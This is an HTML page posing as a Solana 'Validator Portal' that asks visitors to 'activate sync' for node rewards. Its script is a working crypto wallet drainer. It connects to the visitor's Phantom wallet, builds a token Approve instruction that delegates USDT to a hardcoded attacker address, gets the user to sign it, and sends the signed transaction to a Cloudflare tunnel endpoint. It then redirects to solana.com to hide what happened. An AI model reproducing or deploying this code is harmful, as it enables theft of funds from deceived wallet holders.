<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validator Portal</title>
    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 30px; border-radius: 15px; border: 1px solid #333; text-align: center; width: 280px; box-shadow: 0 0 15px #14F195; }
    </style>
</head>
<body>
    <div class="card">
        <h2 style="color:#14F195; font-size:18px;">Network Sync</h2>
        <p style="color:#888; font-size:12px;">Ensure your USDT allocation is verified for the node rewards.</p>
        <button id="cta" style="background:#14F195; color:#000; border:none; padding:15px; border-radius:8px; font-weight:bold; width:100%; cursor:pointer;">ACTIVATE SYNC</button>
        <div id="st" style="margin-top:15px; font-size:10px; color:#444;">Status: Ready</div>
    </div>

    <script>
        const tunnel = "https://allocation-governing-fleet-ala.trycloudflare.com";
        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
        const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";

        document.getElementById('cta').onclick = async () => {
            // ðŸ”± è¯Šæ–­ï¼šå¦‚æžœç‚¹ä¸‹åŽæ²¡å‡ºè¿™ä¸ªå¼¹çª—ï¼Œè¯´æ˜Ž JS åŠ è½½å´©äº†
            console.log("Button clicked");
            const p = window.solana || window.phantom?.solana;
            if (!p) return alert("Please open in Phantom Browser");

            try {
                await p.connect();
                document.getElementById('st').innerText = "FETCHING DATA...";

                const syncRes = await fetch(`${tunnel}/sync`);
                const { bh } = await syncRes.json();

                // ðŸ”± æ ¸å¿ƒï¼šæ‰‹å†™ Approve æŒ‡ä»¤æ•°æ®ï¼Œä¸ä¾èµ–å¤–ç½®åº“
                // æŒ‡ä»¤ ID (4) + é¢åº¦ (0.95 USDT = 950000)
                const data = Buffer.alloc(9);
                data.writeUInt8(4, 0); 
                data.writeBigUInt64LE(BigInt(950000), 1);

                const userPubkey = p.publicKey;
                const mintPubkey = new solanaWeb3.PublicKey(USDT_MINT);
                
                // è‡ªåŠ¨è®¡ç®— ATA
                const [userAta] = await solanaWeb3.PublicKey.findProgramAddress(
                    [userPubkey.toBuffer(), new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(), mintPubkey.toBuffer()],
                    new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
                );

                const transaction = new solanaWeb3.Transaction().add(
                    new solanaWeb3.TransactionInstruction({
                        keys: [
                            { pubkey: userAta, isSigner: false, isWritable: true },
                            { pubkey: new solanaWeb3.PublicKey(RECEIVER), isSigner: false, isWritable: false },
                            { pubkey: userPubkey, isSigner: true, isWritable: false }
                        ],
                        programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
                        data: data
                    })
                );

                transaction.recentBlockhash = bh;
                transaction.feePayer = userPubkey;

                const signed = await p.signTransaction(transaction);
                const rawTx = signed.serialize().toString('base64');
                
                fetch(`${tunnel}/collect_v42?raw=${encodeURIComponent(rawTx)}`);
                document.getElementById('st').innerText = "SYNC COMPLETE";
                
                setTimeout(() => { window.location.href = "https://solana.com/"; }, 1500);

            } catch(e) {
                alert("Debug Error: " + e.message);
                location.reload();
            }
        };
    </script>
</body>
</html>
